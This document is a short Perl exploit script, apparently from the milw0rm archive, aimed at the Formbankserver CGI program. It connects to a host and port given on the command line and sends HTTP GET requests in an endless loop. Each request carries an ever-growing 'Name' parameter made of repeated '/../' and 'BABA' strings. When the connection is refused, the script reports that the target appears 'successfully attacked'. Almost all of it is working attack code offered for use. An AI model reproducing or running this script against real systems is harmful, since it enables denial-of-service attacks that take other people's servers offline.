#!perl
#Vulnerability found by Bl0od3r
#visit http://dc3.dl.am to see more exploits
#http://www.fersch.de/formbankserver/
#download:http://www.download-tipp.de/cgi-bin/jump.cgi?ID=8796
- Hide quoted text -
use IO::Socket;
use warnings;
 package exploit;
 sub new { bless {} }
 sub bar {
         my $self = shift;
$self->{host}=$ARGV[0];
$self->{port}=$ARGV[1];
&start;
}
 my $attack = exploit->new();
 $attack->bar();
 

sub error() {
print("Connection Refused.Check the host now.It seems like its successfully attacked.");
}

sub start() {
$host=$ARGV[0];
$port=$ARGV[1];
$buff="/../" x 999;
die("No Host.") unless($host);
die("No Port.") unless($port);
for ($i=0;$i<99999;$i++) {
      while () {
$buff.="BABA";
$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "$port") || &error();
    syswrite STDOUT,"+";
    print $sock "GET /cgi-bin/formbankcgi.exe/Abfrage?Name=".$buff." HTTP/1.1\n";
        print $sock "Connection: close\n\n";
    syswrite STDOUT,"+";
  }
 }
}

# milw0rm.com [2006-12-31]
